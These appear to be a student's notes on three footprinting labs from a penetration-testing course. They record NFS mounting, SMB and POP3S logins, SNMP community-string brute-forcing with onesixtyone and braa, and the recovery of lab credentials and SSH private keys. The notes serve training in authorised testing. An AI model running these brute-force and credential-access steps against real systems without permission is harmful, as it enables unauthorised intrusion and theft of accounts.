- Additionally, our teammates have found the following credentials **"ceil:qwer1234"**, and they pointed out that some of the company's employees were talking about SSH keys on a forum.

# Lab - 1
---
=> Enumerate the server carefully and find the flag.txt file. Submit the contents of this file as the answer.
- Non default ftp port: 2121 with given credential gives ssh private key

# Lab - 2
---
=> Enumerate the server carefully and find the username "HTB" and its password. Then, submit this user's password as the answer.
- Port `2049` was open indicating NFS
- `/TechSupport` share was found, using `showmount`
- `sudo mount -t nfs 10.129.202.41:/TechSupport /mnt/CPTS_FootLab_1 -o nolock `
- Only one empty ticket file found
	- ![[Pasted image 20250618071008.png]]
- `smbclient -U alex \\\\10.129.202.41\\devshare`    
	- `lol123!mD`
- `sa`:`87N1ns@slls83` => important.txt (No use of sa)
- RDP using `Administrator:87N1ns@slls83` (why?)
- Connect to MSSQL on desktop and get the password from DB


# Lab - 3
---
- Use `onesixtyone` to bruteforce **community string**
	- `onesixtyone -c /usr/share/wordlists/seclists/Discovery/SNMP/snmp.txt 10.129.202.20`
- Backup OID found, use `braa`to bruteforce OIDs and enumerate:
	- `braa backup@10.129.202.20:.1.3.6.*`
	- `tom`:  `NMds732Js2761`
- Login using `pop3s`
	- `openssl s_client -connect 10.129.202.20:pop3s -nocommands`
	- `USER tom`
	- `PASS NMds732Js2761`
	- `RETR 1`
	- Gives private ssh key of `bob` user
- MySQL history file found in user directory, use same credentials of bob to find password in MySQL DB